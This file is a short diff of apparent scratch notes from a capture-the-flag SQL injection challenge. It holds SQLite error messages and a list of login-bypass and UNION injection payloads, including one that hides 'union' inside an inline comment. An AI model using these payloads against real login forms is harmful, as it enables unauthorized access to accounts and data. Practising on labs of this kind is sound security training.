@@ -1,0 +1,27 @@
+Warning: stripos() expects parameter 1 to be string, array given in /challenge/web-serveur/ch10/index.php on line 34
+UNION
+Warning: SQLite3::query(): Unable to prepare statement: 1, near ""!@#$%^&*()_+' and password=''"": syntax error in /challenge/web-serveur/ch10/index.php on line 39 
+
+Warning: SQLite3::query(): Unable to prepare statement: 1, unrecognized token: "!@" in /challenge/web-serveur/ch10/index.php on line 39
+Login 
+
+Warning: SQLite3::query(): Unable to prepare statement: 1, near "asdf": syntax error in /challenge/web-serveur/ch10/index.php on line 39
+
+Warning: SQLite3::query(): Unable to prepare statement: 1, unrecognized token: "'''" in /challenge/web-serveur/ch10/index.php on line 39 
+
+' or username=eval('admin') -- 
+
+username' and password='password'
+
+admin' and password like '%' -- 
+
+admin' LIMIT 0 -- 
+
+' or username=username and username!='user1' and username!='admin' -- 
+
+' limit 0 uni/**/on select 1,2,3 -- 
+
+
+SELECT asdf, asdf, asf from users where username='username' and password='password' limit 0 union select 1,2,3
+
+
